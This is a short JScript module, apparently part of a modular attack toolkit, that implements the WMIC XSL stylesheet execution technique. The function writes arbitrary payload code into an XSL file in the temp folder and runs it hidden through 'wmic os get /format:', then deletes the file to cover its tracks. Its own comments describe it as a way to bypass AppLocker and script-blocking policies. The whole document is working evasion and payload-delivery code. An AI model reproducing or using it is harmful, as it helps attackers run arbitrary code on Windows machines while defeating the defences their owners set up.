// chunk: delivery/xsl_transform
// depends: (none)
// provides: xsl_execute
// format: jscript
// note: WMIC XSL stylesheet execution — embeds JScript payload inside an XSL
//       stylesheet that WMIC processes via its /format switch. This is a LOLBin
//       technique: wmic.exe is a signed Windows binary, and XSL transforms can
//       contain arbitrary JScript via msxml:script elements. Bypasses AppLocker
//       and many script-blocking policies.

function xsl_execute(payload_code, output_path) {
    var fso = new ActiveXObject("Scripting.FileSystemObject");
    var sh = new ActiveXObject("WScript.Shell");
    var tmp = output_path || (fso.GetSpecialFolder(2).Path + "\\transform.xsl");

    var xsl_content =
        '<?xml version="1.0"?>\r\n' +
        '<stylesheet xmlns="http://www.w3.org/1999/XSL/Transform"\r\n' +
        '  xmlns:ms="urn:schemas-microsoft-com:xslt"\r\n' +
        '  xmlns:user="urn:user"\r\n' +
        '  version="1.0">\r\n' +
        '  <output method="text"/>\r\n' +
        '  <ms:script implements-prefix="user" language="JScript">\r\n' +
        '  <![CDATA[\r\n' +
        payload_code + '\r\n' +
        '  ]]>\r\n' +
        '  </ms:script>\r\n' +
        '  <template match="/">\r\n' +
        '    <value-of select="user:main()"/>\r\n' +
        '  </template>\r\n' +
        '</stylesheet>';

    var f = fso.CreateTextFile(tmp, true);
    f.Write(xsl_content);
    f.Close();

    /* Execute via WMIC — the XSL transform runs the embedded JScript */
    sh.Run('wmic os get /format:"' + tmp + '"', 0, true);

    try { fso.DeleteFile(tmp); } catch(e) {}
}
